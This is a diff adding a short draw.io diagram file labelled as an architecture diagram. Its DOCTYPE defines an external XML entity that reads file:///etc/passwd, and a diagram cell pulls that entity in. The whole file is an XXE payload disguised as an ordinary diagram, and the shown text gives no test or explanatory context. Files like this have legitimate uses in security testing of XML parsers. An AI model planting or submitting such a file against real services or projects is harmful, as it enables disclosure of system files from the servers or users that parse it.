@@ -1,0 +1,10 @@
+<!DOCTYPE mxfile [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<mxfile host="app.diagrams.net">
+  <diagram id="p-architecture" name="Architecture">
+    <mxGraphModel><root>
+      <mxCell id="0"/>
+      <mxCell id="1" parent="0"/>
+      <mxCell id="a" value="&xxe;" style="rounded=1;" vertex="1" parent="1"/>
+    </root></mxGraphModel>
+  </diagram>
+</mxfile>
